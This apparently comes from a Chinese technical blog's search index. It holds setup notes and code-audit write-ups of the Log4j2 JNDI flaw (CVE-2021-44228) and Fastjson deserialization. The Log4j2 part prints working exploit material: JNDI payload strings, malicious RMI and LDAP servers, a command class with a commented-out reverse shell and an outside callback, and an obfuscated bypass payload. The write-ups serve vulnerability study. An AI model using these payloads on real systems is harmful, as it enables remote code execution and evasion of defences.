[{"categories":null,"content":"常用网站 Name Link *drive直链提取 https://onedrive.gimhoy.com/ 图片AI放大 https://bigjpg.com/ MSDN https://msdn.itellyou.cn/ ","date":"2021-01-22","objectID":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/:1:0","tags":null,"title":"日常学习速记[置顶]","uri":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/"},{"categories":null,"content":"windows安装时手动分区 diskpart list disk select disk 0 clean convert gpt create partition efi size=500 create partition msr size=300 create partition primary size=61440 size的单位是MB ","date":"2021-01-22","objectID":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/:2:0","tags":null,"title":"日常学习速记[置顶]","uri":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/"},{"categories":null,"content":"pip清华源 pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pip -U pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple ","date":"2021-01-22","objectID":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/:3:0","tags":null,"title":"日常学习速记[置顶]","uri":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/"},{"categories":null,"content":"python2安装opencv出错 pip install opencv-python==4.2.0.32 参考连接 ","date":"2021-01-22","objectID":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/:4:0","tags":null,"title":"日常学习速记[置顶]","uri":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/"},{"categories":null,"content":"ssh算法弃用导致错误 https://wiki.archlinux.org/title/OpenSSH_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#OpenSSH_7.0_%E7%9A%84_%22No_matching_key_exchange_method_found%22_%E9%94%99%E8%AF%AF ssh连接报错no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 解决方法:需要在/etc/ssh/ssh_config中添加KexAlgorithms +diffie-hellman-group1-sha1然后执行sudo ssh-keygen -A ","date":"2021-01-22","objectID":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/:5:0","tags":null,"title":"日常学习速记[置顶]","uri":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/"},{"categories":null,"content":"VMware桥接网卡 在使用虚拟机的过程中,出现了桥接网络无法获取IP的情况,现记录解决方法 1.在菜单栏中选择Edit→Virtual Network Editor 2.点击Change Settings,使用管理员权限修改 3.在桥接模式的设定中,选择桥接到本机的无线网卡 ","date":"2021-01-22","objectID":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/:6:0","tags":null,"title":"日常学习速记[置顶]","uri":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/"},{"categories":null,"content":"开启wsl2或hyperv后Jetbrains的IDE无法启动 PyCharm Pro 2021.3 suddenly cannot start IDE WSL2, Hyper-V \u0026 Reserved Ports 原因:IDE需要绑定的端口6942-6991被系统占用 netsh int ipv4 show excludedportrange protocol=tcp可以查看被系统占用的端口 netsh int ipv4 set dynamic tcp start=40000 num=5000将端口占用的范围修改到40000-45000 reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\hns\\State /v EnableExcludedPortRange /d 0 /f禁止HNS占用 ","date":"2021-01-22","objectID":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/:7:0","tags":null,"title":"日常学习速记[置顶]","uri":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/"},{"categories":null,"content":"bash/zsh配置代理 在.bashrc或者.zshrc中添加如下内容 export hostip=$(cat /etc/resolv.conf |grep -oP '(?\u003c=nameserver\\ ).*'); export https_proxy=\"http://${hostip}:7890\"; export http_proxy=\"http://${hostip}:7890\"; export all_proxy=\"socks5://${hostip}:7890\"; 完成后,输入source .bashrc或者source .zshrc ","date":"2021-01-22","objectID":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/:8:0","tags":null,"title":"日常学习速记[置顶]","uri":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/"},{"categories":null,"content":"oh-my-zsh配置 sh -c \"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" 编辑~/.zshrc将ZSH_THEME的值改为ys或保持默认(个人喜好 隐藏用户名DEFAULT_USER=$USER 安装syntax-highlighting和zsh-autosuggestions git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting \u0026\u0026 git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions \u0026\u0026 chmod -R 555 ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting \u0026\u0026 chmod -R 555 ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions 编辑~/.zshrc plugins=(git z colored-man-pages zsh-autosuggestions zsh-syntax-highlighting extract) 在切换shell后,.bashrc中的代理设置要复制到.zshrc中 使zsh配置生效source ~/.zshrc ","date":"2021-01-22","objectID":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/:9:0","tags":null,"title":"日常学习速记[置顶]","uri":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/"},{"categories":null,"content":"tar命令 https://www.cnblogs.com/jyaray/archive/2011/04/30/2033362.html 压缩 tar –cvf jpg.tar *.jpg 将目录里所有jpg文件打包成tar.jpg tar –czf jpg.tar.gz *.jpg 将目录里所有jpg文件打包成jpg.tar后,并且将其用gzip压缩,生成一个gzip压缩过的包,命名为jpg.tar.gz tar –cjf jpg.tar.bz2 *.jpg 将目录里所有jpg文件打包成jpg.tar后,并且将其用bzip2压缩,生成一个bzip2压缩过的包,命名为jpg.tar.bz2 tar –cZf jpg.tar.Z *.jpg 将目录里所有jpg文件打包成jpg.tar后,并且将其用compress压缩,生成一个umcompress压缩过的包,命名为jpg.tar.Z 解压 tar –xvf file.tar 解压 tar包 tar -xzvf file.tar.gz 解压tar.gz tar -xjvf file.tar.bz2 解压tar.bz2 tar –xZvf file.tar.Z 解压tar.Z 排除目录 --exclude=xxx 排除xxx文件夹 ","date":"2021-01-22","objectID":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/:10:0","tags":null,"title":"日常学习速记[置顶]","uri":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/"},{"categories":null,"content":"tshark权限不足 pi@raspberrypi:~ $ sudo tshark -i wlan0 -w out.pcap Running as user \"root\" and group \"root\". This could be dangerous. Capturing on 'wlan0' tshark: The file to which the capture would be saved (\"out.pcap\") could not be opened: Permission denied. 解决方法sudo tshark -i wlan0 -w /tmp/out.pcap ","date":"2021-01-22","objectID":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/:11:0","tags":null,"title":"日常学习速记[置顶]","uri":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/"},{"categories":null,"content":"hackthebox连接 https://app.hackthebox.com/home 注意事项 选择vpn连接方式时,选择tcp/443 为了保证vpn连接的稳定,请在.ovpn文件中添加指向宿主机的代理 使用openvpn时需要root权限,连接后先用ping检测能否连接题目 ","date":"2021-01-22","objectID":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/:12:0","tags":null,"title":"日常学习速记[置顶]","uri":"/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/"},{"categories":["代码审计"],"content":" 参考文章 https://logging.apache.org/log4j/2.x/manual/lookups.html 从零到一带你深入 log4j2 Jndi RCE CVE-2021-44228 漏洞 ","date":"2022-12-03","objectID":"/log4j2/:0:0","tags":null,"title":"log4j2分析","uri":"/log4j2/"},{"categories":["代码审计"],"content":"属性占位符 package learn; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class log4j2demo { private static final Logger logger = LogManager.getLogger(log4j2demo.class); public static void main(String[] args) { String a=\"${java:os}\"; logger.error(a); } } log4j2中环境变量键值对被封装为了StrLookup对象,这些变量的值可以通过属性占位符来引用,格式为${prefix:key} 属性占位符在lookup下的Interpolator类进行处理 strLookupMap为HashMap类型,将prefix与对应的Lookup方法建立联系 //org.apache.logging.log4j.core.lookup.Interpolator public Interpolator(final Map\u003cString, String\u003e properties) { this.defaultLookup = new MapLookup(properties == null ? new HashMap\u003cString, String\u003e() : properties); // TODO: this ought to use the PluginManager strLookupMap.put(\"log4j\", new Log4jLookup()); strLookupMap.put(\"sys\", new SystemPropertiesLookup()); strLookupMap.put(\"env\", new EnvironmentLookup()); strLookupMap.put(\"main\", MainMapLookup.MAIN_SINGLETON); strLookupMap.put(\"marker\", new MarkerLookup()); strLookupMap.put(\"java\", new JavaLookup()); strLookupMap.put(\"lower\", new LowerLookup()); strLookupMap.put(\"upper\", new UpperLookup()); // JNDI try { // [LOG4J2-703] We might be on Android strLookupMap.put(LOOKUP_KEY_JNDI, Loader.newCheckedInstanceOf(\"org.apache.logging.log4j.core.lookup.JndiLookup\", StrLookup.class)); } catch (final LinkageError | Exception e) { handleError(LOOKUP_KEY_JNDI, e); } ... } 在lookup方法中根据prefix对strLookupMap进行查询,调用对应的Lookup方法 //org.apache.logging.log4j.core.lookup.Interpolator public String lookup(final LogEvent event, String var) { if (var == null) { return null; } final int prefixPos = var.indexOf(PREFIX_SEPARATOR); if (prefixPos \u003e= 0) { final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US); final String name = var.substring(prefixPos + 1); final StrLookup lookup = strLookupMap.get(prefix); //获取的Lookup方法 if (lookup instanceof ConfigurationAware) { ((ConfigurationAware) lookup).setConfiguration(configuration); } String value = null; if (lookup != null) { value = event == null ? lookup.lookup(name) : lookup.lookup(event, name); //调用lookup } if (value != null) { return value; } var = var.substring(prefixPos + 1); } if (defaultLookup != null) { return event == null ? defaultLookup.lookup(var) : defaultLookup.lookup(event, var); } return null; } Demo中使用的是${java:os},因此进入JavaLookup,根据key即os调用getOperatingSystem方法 //org.apache.logging.log4j.core.lookup.JavaLookup public String lookup(final LogEvent event, final String key) { switch (key) { case \"version\": return \"Java version \" + getSystemProperty(\"java.version\"); case \"runtime\": return getRuntime(); case \"vm\": return getVirtualMachine(); case \"os\": return getOperatingSystem(); case \"hw\": return getHardware(); case \"locale\": return getLocale(); default: throw new IllegalArgumentException(key); } } ","date":"2022-12-03","objectID":"/log4j2/:1:0","tags":null,"title":"log4j2分析","uri":"/log4j2/"},{"categories":["代码审计"],"content":"攻击利用 package learn; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class log4j2rce { public static void main(String[] args) { Logger logger = LogManager.getLogger(log4j2rce.class); /* 使用${jndi:key}时,将会调用JndiLookup的lookup方法 使用jndi(javax.naming)获取value */ // logger.fatal(\"${jndi:rmi://127.0.0.1:1099/exp}\");//RMI方式复现 logger.error(\"${jndi:ldap://127.0.0.1:1389/exp}\");//LDAP方法复现 } } RMI package learn.RMIServer; public class EXEC { public EXEC() { try { // String command = \"bash -c $@|bash 0 echo bash -i \u003e\u0026 /dev/tcp/127.0.0.1/7000 0\u003e\u00261\"; String command = \"curl http://rmi.5f573be3.dns.1433.eu.org\"; Process pc = Runtime.getRuntime().exec(command); pc.waitFor(); } catch (Exception e) { e.printStackTrace(); } } public static void main(String[] args) { new EXEC(); } } package learn.RMIServer; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Server { public static void main(String[] args) { try { LocateRegistry.createRegistry(1099); Registry registry = LocateRegistry.getRegistry(); Reference reference = new Reference(\"learn.RMIServer.EXEC\", \"learn.RMIServer.EXEC\", null); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\"exp\", referenceWrapper);// rmi://127.0.0.1:1099/exp } catch (Exception e) { e.printStackTrace(); } } } LDAP package learn.LDAPServer; import java.net.*; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; public class Server { private static final String LDAP_BASE = \"dc=example,dc=com\"; private static final String http_server_ip = \"10.10.10.1\"; private static final int ldap_port = 1389; private static final int http_server_port = 8000; private static class OperationInterceptor extends InMemoryOperationInterceptor { @Override public void processSearchResult(InMemoryInterceptedSearchResult result) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { // e.addAttribute(\"javaClassName\", \"learn.LDAPServer.EXEC\");// 类名 // e.addAttribute(\"javaFactory\", \"learn.LDAPServer.EXEC\");//工厂类名 e.addAttribute(\"javaCodeBase\", \"http://\" + http_server_ip + \":\" + http_server_port + \"/\");// 设置远程的恶意引用对象的地址 e.addAttribute(\"objectClass\", \"javaNamingReference\"); e.addAttribute(\"javaClassName\", \"EXEC\"); e.addAttribute(\"javaFactory\", \"EXEC\"); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } catch (Exception e1) { e1.printStackTrace(); } } } public static void main(String[] args) throws Exception { try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);// 创建LDAP配置对象 config.setListenerConfigs(new InMemoryListenerConfig(\"listen\", InetAddress.getByName(\"0.0.0.0\"), ldap_port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault()));// 设置LDAP监听配置信息 config.addInMemoryOperationInterceptor(new OperationInterceptor());// 添加自定义的LDAP操作拦截器 InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);// 创建LDAP服务对象 ds.startListening();// 开始监听 System.out.println(\"Listening on 0.0.0.0:\" + ldap_port); } catch (Exception e) { e.printStackTrace(); } } } ","date":"2022-12-03","objectID":"/log4j2/:2:0","tags":null,"title":"log4j2分析","uri":"/log4j2/"},{"categories":["代码审计"],"content":"链条分析 ","date":"2022-12-03","objectID":"/log4j2/:3:0","tags":null,"title":"log4j2分析","uri":"/log4j2/"},{"categories":["代码审计"],"content":"日志记录 在org.apache.logging.log4j.spi.AbstractLogger中存在多个logIfEnabled的重载方法,这些方法根据当前配置的日志记录级别,来判断是否需要进行logMessage操作 //org.apache.logging.log4j.spi.AbstractLogger public void logIfEnabled(final String fqcn, final Level level, final Marker marker, final String message, final Throwable t) { if (isEnabled(level, marker, message, t)) { logMessage(fqcn, level, marker, message, t); } } ","date":"2022-12-03","objectID":"/log4j2/:3:1","tags":null,"title":"log4j2分析","uri":"/log4j2/"},{"categories":["代码审计"],"content":"字符串处理 在substitute方法中对字符串进行替换操作 //org.apache.logging.log4j.core.lookup.StrSubstitutor private int substitute(final LogEvent event, final StringBuilder buf, final int offset, final int length, List\u003cString\u003e priorVariables) { final StrMatcher prefixMatcher = getVariablePrefixMatcher(); //${ final StrMatcher suffixMatcher = getVariableSuffixMatcher(); //} final char escape = getEscapeChar(); //$ final StrMatcher valueDelimiterMatcher = getValueDelimiterMatcher(); //:- final boolean substitutionInVariablesEnabled = isEnableSubstitutionInVariables(); //启用变量替换,默认为true final boolean top = priorVariables == null; boolean altered = false; int lengthChange = 0; char[] chars = getChars(buf); int bufEnd = offset + length; int pos = offset; while (pos \u003c bufEnd) { final int startMatchLen = prefixMatcher.isMatch(chars, pos, offset, bufEnd); //对开头的${进行匹配 if (startMatchLen == 0) { pos++; } else { // found variable start marker if (pos \u003e offset \u0026\u0026 chars[pos - 1] == escape) { // escaped buf.deleteCharAt(pos - 1); chars = getChars(buf); lengthChange--; altered = true; bufEnd--; } else {//查找后缀 // find suffix final int startPos = pos; pos += startMatchLen; int endMatchLen = 0; int nestedVarCount = 0; while (pos \u003c bufEnd) { if (substitutionInVariablesEnabled \u0026\u0026 (endMatchLen = prefixMatcher.isMatch(chars, pos, offset, bufEnd)) != 0) { //通过while循环处理嵌套变量,即${${${}}}的情况,直到没有嵌套 // found a nested variable start nestedVarCount++; pos += endMatchLen; continue; } endMatchLen = suffixMatcher.isMatch(chars, pos, offset, bufEnd); if (endMatchLen == 0) { pos++; } else { //找到匹配的后缀 // found variable end marker if (nestedVarCount == 0) { String varNameExpr = new String(chars, startPos + startMatchLen, pos - startPos - startMatchLen); //将${xx}中的内容提取出来 if (substitutionInVariablesEnabled) { final StringBuilder bufName = new StringBuilder(varNameExpr); substitute(event, bufName, 0, bufName.length());//递归处理,后续可以利用这一点进行dos攻击或攻击流量混淆 varNameExpr = bufName.toString(); } pos += endMatchLen; final int endPos = pos; String varName = varNameExpr; String varDefaultValue = null; if (valueDelimiterMatcher != null) { final char [] varNameExprChars = varNameExpr.toCharArray(); int valueDelimiterMatchLen = 0; for (int i = 0; i \u003c varNameExprChars.length; i++) { // if there's any nested variable when nested variable substitution disabled, then stop resolving name and default value. if (!substitutionInVariablesEnabled \u0026\u0026 prefixMatcher.isMatch(varNameExprChars, i, i, varNameExprChars.length) != 0) { break; } if (valueEscapeDelimiterMatcher != null) { int matchLen = valueEscapeDelimiterMatcher.isMatch(varNameExprChars, i); if (matchLen != 0) { //根据valueEscapeDelimiterMatcher:\\-进行分割处理 String varNamePrefix = varNameExpr.substring(0, i) + Interpolator.PREFIX_SEPARATOR; varName = varNamePrefix + varNameExpr.substring(i + matchLen - 1); for (int j = i + matchLen; j \u003c varNameExprChars.length; ++j){ if ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, j)) != 0) { varName = varNamePrefix + varNameExpr.substring(i + matchLen, j); varDefaultValue = varNameExpr.substring(j + valueDelimiterMatchLen); break; } } break; } else { //根据valueDelimiterMatcher即:-进行分割处理 if ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != 0) { varName = varNameExpr.substring(0, i); varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen); break; } } } else { if ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != 0) { varName = varNameExpr.substring(0, i); varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen); break; } } } } // on the first call initialize priorVariables if (priorVariables == null) { priorVariables = new ArrayList\u003c\u003e(); priorVariables.add(new String(chars, offset, length + lengthChange)); } // handle cyclic substitution checkCyclicSubstitution(varName, priorVariables); priorVariables.add(varName); // resolve the variable String varValue = resolveVariable(event, varName, buf, startPos, endPos); //对解析出的var","date":"2022-12-03","objectID":"/log4j2/:3:2","tags":null,"title":"log4j2分析","uri":"/log4j2/"},{"categories":["代码审计"],"content":"lookup处理 //org.apache.logging.log4j.core.lookup.Interpolator public String lookup(final LogEvent event, String var) { if (var == null) { return null; } final int prefixPos = var.indexOf(PREFIX_SEPARATOR);//PREFIX_SEPARATOR为冒号,这里对prefix:key进行分割操作 if (prefixPos \u003e= 0) { final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US);//提取prefix final String name = var.substring(prefixPos + 1);//提取name final StrLookup lookup = strLookupMap.get(prefix);//根据prefix获取lookup if (lookup instanceof ConfigurationAware) { ((ConfigurationAware) lookup).setConfiguration(configuration); } String value = null; if (lookup != null) { value = event == null ? lookup.lookup(name) : lookup.lookup(event, name);//进行lookup操作 } if (value != null) { return value; } var = var.substring(prefixPos + 1); } if (defaultLookup != null) { return event == null ? defaultLookup.lookup(var) : defaultLookup.lookup(event, var); } return null; } //org.apache.logging.log4j.core.lookup.JndiLookup public String lookup(final LogEvent event, final String key) { if (key == null) { return null; } final String jndiName = convertJndiName(key); try (final JndiManager jndiManager = JndiManager.getDefaultManager()) { return Objects.toString(jndiManager.lookup(jndiName), null); } catch (final NamingException e) { LOGGER.warn(LOOKUP, \"Error looking up JNDI resource [{}].\", jndiName, e); return null; } } jndiManager.lookup进行JNDI注入 ","date":"2022-12-03","objectID":"/log4j2/:3:3","tags":null,"title":"log4j2分析","uri":"/log4j2/"},{"categories":["代码审计"],"content":"递归解析与混淆 package learn; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class log4j2bypass { public static void main(String[] args) { Logger logger = LogManager.getLogger(log4j2rce.class); logger.fatal(\"${${1234:-j}${1234:-n}${45334576:-d}${34241234:-i}:${1234:-l}${1234:-d}${1234:-a}${1234:-p}://${1234:-1}${1234:-2}7.0.0.1:1389/exp}\");//bypass } } 同样对substitute方法进行分析 由于存在${${}}的嵌套情况,因此进行了多次递归处理 以第一个${1234:-j}为例,对valueDelimiterMatcher进行分析,在去除${}后,对1234:-j进行拆分处理 对拆分出的1234进行resolve处理,最终返回null public String lookup(final LogEvent event, String var) { if (var == null) { return null; } final int prefixPos = var.indexOf(PREFIX_SEPARATOR); if (prefixPos \u003e= 0) { final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US); final String name = var.substring(prefixPos + 1); final StrLookup lookup = strLookupMap.get(prefix); if (lookup instanceof ConfigurationAware) { ((ConfigurationAware) lookup).setConfiguration(configuration); } String value = null; if (lookup != null) { value = event == null ? lookup.lookup(name) : lookup.lookup(event, name); } if (value != null) { return value; } var = var.substring(prefixPos + 1); } if (defaultLookup != null) { return event == null ? defaultLookup.lookup(var) : defaultLookup.lookup(event, var); } return null; } public String lookup(final LogEvent event, final String key) { final boolean isMapMessage = event != null \u0026\u0026 event.getMessage() instanceof MapMessage; if (map == null \u0026\u0026 !isMapMessage) { return null; } if (map != null \u0026\u0026 map.containsKey(key)) { final String obj = map.get(key); if (obj != null) { return obj; } } if (isMapMessage) { return ((MapMessage) event.getMessage()).get(key); } return null; } String varValue = resolveVariable(event, varName, buf, startPos, endPos);//varValue为null if (varValue == null) { varValue = varDefaultValue;//此时varValue为j } if (varValue != null) { // recursive replace final int varLen = varValue.length(); buf.replace(startPos, endPos, varValue); altered = true; int change = substitute(event, buf, startPos, varLen, priorVariables); change = change + (varLen - (endPos - startPos)); pos += change; bufEnd += change; lengthChange += change; chars = getChars(buf); // in case buffer was altered // chars被调整为j${1234:-n} } 不断重复上述操作,直到chars被调整为jndi:ldap://127.0.0.1:1389/exp,进行lookup操作 ","date":"2022-12-03","objectID":"/log4j2/:4:0","tags":null,"title":"log4j2分析","uri":"/log4j2/"},{"categories":["代码审计"],"content":" 参考文章 Fastjson 反序列化分析 浅析Fastjson1.2.62-1.2.68反序列化漏洞 ","date":"2022-11-10","objectID":"/fastjson/:0:0","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"基本使用 \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.alibaba\u003c/groupId\u003e \u003cartifactId\u003efastjson\u003c/artifactId\u003e \u003cversion\u003e1.2.24\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.unboundid\u003c/groupId\u003e \u003cartifactId\u003eunboundid-ldapsdk\u003c/artifactId\u003e \u003cversion\u003e3.1.1\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e User类 package learn; import java.util.Properties; public class User { private String name; private Properties properties; private Integer age; public User() { this.properties = new Properties(); System.out.println(\"User Construct\"); } public String getName() { System.out.println(\"getName\"); return name; } public void setName(String name) { System.out.println(\"setName\"); this.name = name; } public Integer getAge() { System.out.println(\"getAge\"); return age; } public void setAge(Integer age) { System.out.println(\"setAge\"); this.age = age; } public Properties getProperties() { System.out.println(\"getProperties\"); return properties; } @Override public String toString() { System.out.println(\"toString\"); return \"User{\" + \"name='\" + name + '\\'' + \", age=\" + age + \", properties=\" + properties + '}'; } } 不指定@type package learn; import com.alibaba.fastjson.JSON; public class Parse { public static void main(String[] args) { User user1 = new User(); user1.setAge(13); user1.setName(\"张三\"); System.out.println(user1); System.out.println(\"---\"); /* fastjson将类转换为json字符串,在转换的同时调用了get方法 */ String json1 = JSON.toJSONString(user1); System.out.println(json1); System.out.println(\"---\"); /* fastjson将字符串转换为类会自动调用construct方法和set方法 */ Object parse1 = JSON.parse(json1); System.out.println(\"parse1 \" + parse1); System.out.println(parse1.getClass());// class com.alibaba.fastjson.JSONObject System.out.println(\"---\"); Object parse2 = JSON.parseObject(json1); System.out.println(\"parse2 \" + parse2); System.out.println(parse2.getClass());// class com.alibaba.fastjson.JSONObject System.out.println(\"---\"); User parse3 = JSON.parseObject(json1, User.class); System.out.println(\"parse3 \" + parse3); System.out.println(parse3.getClass());// class learn.User System.out.println(\"---\"); } } 指定@type package learn; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.serializer.SerializerFeature; public class ParseWithType { public static void main(String[] args) { User user1 = new User(); user1.setAge(13); user1.setName(\"张三\"); System.out.println(user1); System.out.println(\"---\"); /* 输出带有一个@type参数,值为learn.User类 */ String json2 = JSON.toJSONString(user1, SerializerFeature.WriteClassName); System.out.println(json2); System.out.println(\"---\"); /* parse会转换为@type指定的类 */ Object parse1 = JSON.parse(json2); System.out.println(\"parse1 \" + parse1); System.out.println(parse1.getClass());// class learn.User System.out.println(\"---\"); /* parseObject会转换为JSONObject类 */ Object parse2 = JSON.parseObject(json2); System.out.println(\"parse2 \" + parse2); System.out.println(parse2.getClass());// class com.alibaba.fastjson.JSONObject System.out.println(\"---\"); /* parseObject中指定类参数则会转换为其指定的类 */ User parse3 = JSON.parseObject(json2, User.class); System.out.println(\"parse3 \" + parse3); System.out.println(parse3.getClass());// class learn.User System.out.println(\"---\"); } } ","date":"2022-11-10","objectID":"/fastjson/:1:0","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"getProperties被调用的原因 三个getter方法,只有getProperties被调用 //com.alibaba.fastjson.util.JavaBeanInfo for (Method method : clazz.getMethods()) { // getter methods /* 通过getMethods获取所有公共方法,然后通过循环判断这些方法是否可以加入fieldList中 */ String methodName = method.getName(); if (methodName.length() \u003c 4) {// 方法名长度大于4 continue; } if (Modifier.isStatic(method.getModifiers())) {// 方法不是静态方法 continue; } if (methodName.startsWith(\"get\") \u0026\u0026 Character.isUpperCase(methodName.charAt(3))) {// 方法名必须以get开头,然后getXxx必须首字母大写 ... if (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType()) { //判断接口是否相同 String propertyName; JSONField annotation = method.getAnnotation(JSONField.class); if (annotation != null \u0026\u0026 annotation.deserialize()) { continue; } if (annotation != null \u0026\u0026 annotation.name().length() \u003e 0) { propertyName = annotation.name(); } else { propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4); } /* methodName = getAge propertyName = age */ FieldInfo fieldInfo = getField(fieldList, propertyName);//判断propertyName是否存在于fieldList中,即判断是否存在setAge方法 if (fieldInfo != null) {//没有setAge方法则添加到fieldList中 continue; } add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, 0, 0, 0, annotation, null, null)); } } } ","date":"2022-11-10","objectID":"/fastjson/:1:1","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"parseObject(json)调用所有setter和getter的原因 //com.alibaba.fastjson.JSON public static JSONObject parseObject(String text) { Object obj = parse(text);//JSON.parse(json) if (obj instanceof JSONObject) { return (JSONObject) obj; } return (JSONObject) JSON.toJSON(obj);//主要原因在于对解析出的json对象进行了一次toJSON操作 } public static Object toJSON(Object javaObject, SerializeConfig config) { if (serializer instanceof JavaBeanSerializer) { JavaBeanSerializer javaBeanSerializer = (JavaBeanSerializer) serializer; JSONObject json = new JSONObject(); try { Map\u003cString, Object\u003e values = javaBeanSerializer.getFieldValuesMap(javaObject);//对json中的getter进行遍历 ... } return json; } } sortedGetters保存了所有getter的名称 